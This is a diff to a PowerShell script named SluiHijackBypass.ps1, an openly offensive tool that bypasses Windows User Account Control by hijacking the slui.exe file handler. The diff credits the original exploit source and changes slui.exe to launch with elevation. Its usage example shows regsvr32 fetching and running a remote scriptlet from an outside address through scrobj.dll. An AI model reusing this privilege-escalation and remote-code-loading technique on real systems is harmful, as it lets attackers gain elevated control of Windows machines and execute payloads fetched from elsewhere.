@@ -7,6 +7,7 @@
 	Author     : Gushmazuko
 .LINK
 	https://github.com/gushmazuko/tools/blob/master/SluiHijackBypass.ps1
+	Original source: https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation
 .EXAMPLE
 	Load "regsvr32 -s -n -u -i:http://192.168.0.10/runner.cst scrobj.dll":
 	SluiHijackBypass -http "http://192.168.0.10/runner.cst"
@@ -27,10 +28,10 @@ function SluiHijackBypass(){
 
 	#Perform the bypass
 		#In Windows execution
-		#Start-Process "C:\Windows\System32\slui.exe" -WindowStyle Hidden
+		Start-Process "C:\Windows\System32\slui.exe" -Verb runas
 
 		#Remote execution
-		C:\Windows\Sysnative\cmd.exe /c C:\Windows\System32\slui.exe
+		#C:\Windows\Sysnative\cmd.exe /c C:\Windows\System32\slui.exe
 
 	#Remove registry structure
 	Start-Sleep 3
